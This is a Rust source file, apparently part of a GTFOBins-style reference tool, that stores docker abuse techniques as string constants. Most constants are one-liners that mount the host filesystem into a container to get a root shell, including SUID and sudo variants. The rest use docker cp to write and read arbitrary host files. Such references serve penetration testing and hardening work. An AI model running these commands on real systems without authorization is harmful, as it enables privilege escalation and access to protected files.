
pub static BIN_NAME: &'static str = "docker";
pub static BIN_DESC: &'static str = "This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.

Any other Docker Linux image should work, e.g., `debian`.";
pub static SH_DESC: &'static str = "The resulting is a root shell.";
pub static SH_CODE: &'static str = r#"
    
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
"#;
pub static FW_DESC: &'static str = "Write a file by copying it to a temporary container and back to the target destination on the host.";
pub static FW_CODE: &'static str = r#"
    
    CONTAINER_ID="$(docker run -d alpine)" # or existing
    TF=$(mktemp)
    echo "DATA" > $TF
    docker cp $TF $CONTAINER_ID:$TF
    docker cp $CONTAINER_ID:$TF file_to_write
"#;
pub static FR_DESC: &'static str =
    "Read a file by copying it to a temporary container and back to a new location on the host.";
pub static FR_CODE: &'static str = r#"
    
    CONTAINER_ID="$(docker run -d alpine)"  # or existing
    TF=$(mktemp)
    docker cp file_to_read $CONTAINER_ID:$TF
    docker cp $CONTAINER_ID:$TF $TF
    cat $TF
"#;
pub static SUID_DESC: &'static str = "The resulting is a root shell.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which docker) .

    ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
"#;
pub static SUDO_DESC: &'static str = "The resulting is a root shell.";
pub static SUDO_CODE: &'static str = r#"
    
    sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
